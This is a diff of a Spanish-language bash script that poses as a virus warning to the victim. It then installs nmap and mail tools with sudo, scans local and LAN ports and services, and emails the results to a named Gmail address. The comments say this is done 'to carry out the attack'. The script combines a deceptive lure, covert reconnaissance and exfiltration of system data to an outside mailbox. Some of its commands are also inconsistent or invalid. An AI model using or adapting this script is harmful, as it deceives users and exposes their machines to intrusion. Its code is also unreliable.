@@ -1,17 +1,25 @@
 echo "Tu pc está siendo escaneado por un virus,pinche aquí para pararlo"
+#mensaje preventivo 
 
  sudo apt install nmap -y
+#le obligamos a instalar nmap para descubrir que puertos tiene vulnerable y servicios en ellos 
+
  sudo apt install mailutils -y
+ #le instalamos mailutils para poder mandar correos
+
  sudo apt install postfix -y
+  #le añadimos el postfix para poder mandar correos
+
  sudo dpkg-reconfigure postfix -y 
  #reconfiguramos postfix para poder mandar correos
- #le añadimos el postfix para poder mandar correos
- #le instalamos mailutils para poder mandar correos
-#se lo volvemos a añadir ya que debe ser usado en máquina linux
-#le obligamos a instalar nmap para descubrir que puertos tiene vulnerable
+
+
+# volvemos a añadir sudo ya que debe ser usado en máquina linux
+
 
 touch resultado_nmap.txt
-#le creamos un archivo de texto donde mandara los resultados
+#le creamos un archivo de texto donde mandara los resultados de los puertos escaneados
+
 touch servicios_detectados.txt
 #le creamos un archivo de texto donde mandara los servicios que tiene abiertos
 
@@ -20,7 +28,7 @@ nmap -p 1-5000 127.0.0.1 -oN resultado_nmap.txt
 #le añadimos el archivo de texto donde mandara los resultados
 
 nmap -sV -p$(cat resultado_nmap.txt | grep "open" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',') 192.168.1.100 -oN servicios_detectados.txt
-#le añadimos que nos muestre los servicios que tiene abiertos en los puertos que hemos encontrado
+#le añadimos otro escaneo que nos muestre los servicios que tiene abiertos en los puertos que hemos encontrado
 
 mail -s "Resultados Nmap" richardo94ac@gmail.com < resultado_nmap.txt
 #le añadimos que nos mande por correo los resultados para poder realizar el ataque. 
